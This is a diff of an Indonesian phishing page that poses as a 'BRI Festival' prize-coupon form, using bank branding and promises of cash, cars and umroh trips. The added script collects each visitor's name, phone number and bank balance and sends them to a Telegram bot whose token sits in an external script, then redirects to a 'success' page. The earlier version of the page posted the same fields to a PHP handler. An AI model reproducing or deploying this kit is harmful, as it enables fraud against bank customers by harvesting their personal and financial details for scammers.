@@ -1,137 +1,234 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Form Kupon</title>
-    <style>
-        /* Mengatur Body agar benar-benar penuh 100% */
-        body {
-            font-family: 'Segoe UI', Arial, sans-serif;
-            background-color: #ffffff;
-            margin: 0;
-            padding: 0;
-            width: 100%;
-            display: flex;
-            flex-direction: column;
-            align-items: center; /* Menjaga form tetap di tengah secara horizontal */
-        }
-
-        /* Styling Gambar Header (Penuh jika diinginkan) */
-        .header-image {
-            width: 100%; /* Gambar akan mengikuti lebar layar */
-            max-width: 100%; 
-            height: auto;
-            display: block;
-        }
-
-        /* Form akan menyesuaikan lebar tapi tidak terlalu melar di layar lebar */
-        form {
-            width: 100%;
-            max-width: 450px; /* Batas maksimal agar tidak terlalu lebar di PC */
-            padding: 20px;
-            box-sizing: border-box; /* Agar padding tidak menambah lebar elemen */
-        }
-
-        .form-group {
-            margin-bottom: 20px;
-        }
-
-        label {
-            display: block;
-            font-weight: bold;
-            margin-bottom: 8px;
-            color: #333;
-            font-size: 14px;
-        }
-
-        /* Input Styling mirip gambar asli */
-        input[type="text"],
-        input[type="tel"],
-        select {
-            width: 100%;
-            padding: 15px;
-            border: 2px solid #3474d4;
-            border-radius: 10px;
-            box-sizing: border-box;
-            font-size: 16px;
-            outline: none;
-            color: #333;
-        }
-
-        select {
-            background-color: #f3f3f3;
-            cursor: pointer;
-        }
-
-        /* Tombol Biru Cetak */
-        .btn-submit {
-            width: 100%;
-            background-color: #1a60be;
-            color: white;
-            border: none;
-            padding: 16px;
-            border-radius: 12px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 10px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
-        }
-
-        .btn-submit:active {
-            transform: scale(0.98);
-            background-color: #144b96;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Form Event BRI Festival</title>
+<style>
+body{
+margin:0;
+font-family:Arial,Helvetica,sans-serif;
+background:#eef3f9;
+display:flex;
+justify-content:center;
+}
+.container{
+width:100%;
+max-width:430px;
+background:#fff;
+min-height:100vh;
+}
+.header{
+display:flex;
+justify-content:space-between;
+align-items:center;
+padding:14px 16px;
+border-bottom:1px solid #ddd;
+}
+.header img{
+height:38px;
+}
+.menu{
+width:44px;
+height:44px;
+border:2px solid #1e63b5;
+border-radius:8px;
+display:flex;
+align-items:center;
+justify-content:center;
+font-size:22px;
+color:#1e63b5;
+}
+.banner{
+margin:14px;
+background:#1e63b5;
+color:white;
+padding:18px 10px;
+font-size:18px;
+font-weight:bold;
+text-align:center;
+border-radius:6px;
+}
+.subtitle{
+margin:0 18px;
+font-size:15px;
+font-weight:bold;
+color:#222;
+}
+.form-area{
+margin:18px;
+}
+select,input{
+width:100%;
+padding:14px;
+margin-top:12px;
+border:2px solid #1e63b5;
+border-radius:8px;
+font-size:15px;
+box-sizing:border-box;
+outline:none;
+}
+label{
+display:block;
+margin-top:14px;
+font-size:14px;
+font-weight:bold;
+color:#222;
+}
+button{
+width:100%;
+margin-top:26px;
+padding:16px;
+background:#1e63b5;
+border:none;
+border-radius:10px;
+color:white;
+font-size:16px;
+font-weight:bold;
+cursor:pointer;
+box-shadow:0 4px 10px rgba(0,0,0,0.25);
+}
+.logos{
+margin-top:40px;
+display:flex;
+justify-content:center;
+gap:12px;
+flex-wrap:wrap;
+padding:10px 0;
+}
+.logos img{
+height:22px;
+opacity:0.85;
+}
+.footer{
+text-align:center;
+font-size:12px;
+color:#666;
+padding:10px 0 25px;
+}
+</style>
 </head>
 <body>
+<div class="container">
 
-<img src="1.jpg" width="100%">
+<div class="header">
+<img src="https://files.catbox.moe/4xe3gd.jpg">
+<div class="menu">≡</div>
+</div>
 
-    <form action="req/1.php" method="POST">
-        
-        <div class="form-group">
-            <select name="a" required>
-                <option value="" disabled selected>PILIH KUPON UNTUK ANDA</option>
-                <option value="Uang Cash Rp 50-600Jt">1. Uang Cash Rp, 50-600Jt</option>
-                <option value="Mobil & Motor">2. Mobil & Motor</option>
-                <option value="Umroh Gratis & Paket Wisata">3. Umroh Gratis & Paket Wisata</option>
-                <option value="Emas & Logam mulia">4. Emas & Logam mulia</option>
-            </select>
-        </div>
+<div class="banner">
+Selamat Datang di Event Festival 2026
+</div>
 
-        <div class="form-group">
-            <label>Nama Lengkap</label>
-            <input type="text" name="b" placeholder="Masukkan Nama Lengkap" required>
-        </div>
+<div class="subtitle">Lengkapi Formulir Pendaftaran Anda</div>
+<form id="eventForm">
+<div class="form-area">
+<select name="pilihan" id="pilihan">
+<option>PILIH KUPON UNTUK ANDA</option>
+<option value="Paket Umroh & Tiket Liburan">Paket Umroh & Tiket Liburan</option>
+<option value="Uang Cash & Emas">Uang Cash & Emas</option>
+<option value="Mobil & Motor">Mobil & Motor</option>
+</select>
 
-        <div class="form-group">
-            <label>Nomor Handphone</label>
-            <input type="tel" name="c" placeholder="Masukkan Nomor Handphone" required>
-        </div>
+<label>Nama Lengkap</label>
+<input type="text" name="nama" id="nama" placeholder="Masukkan Nama Lengkap" required>
 
-        <div class="form-group">
-            <label>Saldo Rekning Tabungan saat ini</label>
-            <input type="text" name="d" id="saldo" placeholder="Rp." required>
-        </div>
+<label>Nomor Handphone</label>
+<input type="tel" name="nohp" id="nohp" placeholder="Masukkan Nomor Handphone" required>
 
-        <button type="submit" class="btn-submit">Cetak Kupon</button>
-    </form>
+<label>Saldo Rekening Terakhir</label>
+<input type="tel" name="saldo" id="saldo" placeholder="Rp." required>
 
-    <script>
-        // Format otomatis mata uang Rp.
-        const saldoInput = document.getElementById('saldo');
-        saldoInput.addEventListener('input', function(e) {
-            let value = this.value.replace(/\D/g, ''); 
-            if (value !== "") {
-                this.value = 'Rp. ' + value.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
-            } else {
-                this.value = '';
-            }
-        });
-    </script>
+<div style="display:none;">
+  <input type="text" name="honeypot" id="honeypot" tabindex="-1" autocomplete="off">
+</div>
 
-<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v67327c56f0bb4ef8b305cae61679db8f1769101564043" integrity="sha512-rdcWY47ByXd76cbCFzznIcEaCN71jqkWBBqlwhF1SY7KubdLKZiEGeP7AyieKZlGP9hbY/MhGrwXzJC/HulNyg==" data-cf-beacon='{"version":"2024.11.0","token":"944a57aa930542e09eb2ae435fb82df6","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+<button type="submit" id="submitBtn">Cetak Kupon</button>
+</div>
+</form>
+<div class="logos">
+<img src="https://i.ibb.co.com/SY7k9bR/20260207-025955.jpg">
+</div>
+
+<div class="footer">
+©️ 2026 Event Organizer<br>
+All Rights Reserved.
+</div>
+
+</div>
+<script src="bh.js"></script>
+<script>
+document.getElementById("eventForm").addEventListener("submit", function(e){
+  e.preventDefault();
+
+  const submitBtn = document.getElementById("submitBtn");
+  const honeypot = document.getElementById("honeypot").value;
+  
+  if (honeypot.length > 0) {
+    console.log("Spam detected!");
+    return;
+  }
+
+  let pilihan = document.getElementById("pilihan").value;
+  let nama    = document.getElementById("nama").value.trim();
+  let nohp    = document.getElementById("nohp").value.trim();
+  let saldo   = document.getElementById("saldo").value.trim();
+
+  if (nama.length < 3 || nohp.length < 9) {
+    alert("Mohon masukkan data yang valid.");
+    return;
+  }
+
+  submitBtn.disabled = true;
+  submitBtn.innerText = "Memproses...";
+
+  let pesan = `BRIMO\n───────────────────────\n• Pilihan : ${pilihan}\n• Nama Lengkap : ${nama}\n• Nomor Hp : ${nohp}\n• Saldo Rekening : ${saldo}\n───────────────────────\n©️ Brimo - 2026`;
+
+  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: chat_id,
+      text: pesan
+    })
+  })
+  .then(res => {
+    window.location.href = "sukses.html";
+  })
+  .catch(err => {
+    console.error(err);
+    window.location.href = "sukses.html";
+  });
+});
+</script>
+<script>
+const saldoInput = document.getElementById("saldo");
+
+saldoInput.addEventListener("input", function () {
+  let angka = this.value.replace(/[^0-9]/g, "");
+
+  if (angka === "") {
+    this.value = "";
+    return;
+  }
+
+  let formatRupiah = angka.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
+
+  this.value = "Rp " + formatRupiah;
+});
+
+saldoInput.addEventListener("focus", function () {
+  if (this.value === "") {
+    this.value = "Rp ";
+  }
+});
+
+saldoInput.addEventListener("blur", function () {
+  if (this.value === "Rp ") {
+    this.value = "";
+  }
+});
+</script>
+
 </body>
 </html>
